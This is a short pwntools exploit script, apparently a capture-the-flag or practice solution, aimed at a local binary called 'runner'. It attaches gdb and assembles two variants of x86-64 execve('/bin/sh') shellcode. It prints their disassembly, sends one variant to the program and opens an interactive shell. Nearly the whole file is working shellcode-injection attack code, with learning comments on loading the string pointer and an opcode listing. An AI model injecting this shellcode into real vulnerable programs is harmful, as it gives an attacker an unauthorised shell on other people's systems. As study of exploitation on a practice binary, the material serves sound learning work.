# !/usr/bin/python3
from pwn import *

gdb_script = """
b *main+100
c
"""


p = process("./runner")
gdb.attach(p, gdbscript=gdb_script)

context.arch = "amd64"

binsh = u64(b"/bin/sh\x00")


# Cannot LOAD DIRECT strings into RDI. NEED to load pointer
EXECVE = 0x3B


# Push RSP always points to the recently pushed item in stack
# myShellCode = f"""
#     mov rbx, {binsh}
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 0x3b
#     push rbx
#     mov rdi, rsp
#     syscall
# """

myShellCode = f""" 
mov rax, {EXECVE}
xor rdx, rdx
xor rsi, rsi
mov rbx, {binsh}
push rbx
mov rdi, rsp
syscall
"""

shellCodeUseStack = f""" 
    lea rbx, [rip + binsh]
    xor rdx, rdx
    xor rsi, rsi
    lea rdi, [rbx]
    mov rax, {EXECVE}
    syscall
binsh: 
    .string "/bin/sh"
"""
# NOTE:
# Corresponding op code:
# You can see that the '/bin/sh' is stored after the syscall
#    0:   48 8d 1d 12 00 00 00    lea    rbx, [rip+0x12]        # 0x19
#    7:   48 31 d2                xor    rdx, rdx
#    a:   48 31 f6                xor    rsi, rsi
#    d:   48 8d 3b                lea    rdi, [rbx]
#   10:   48 c7 c0 3b 00 00 00    mov    rax, 0x3b
#   17:   0f 05                   syscall
#   19:   2f                      (bad)
#   1a:   62 69 6e 2f 73       lls   (bad)
#   1f:   68                      .byte 0x68

payload = asm(shellCodeUseStack)
print(disasm(payload))


p.sendlineafter("that", payload)


p.interactive()
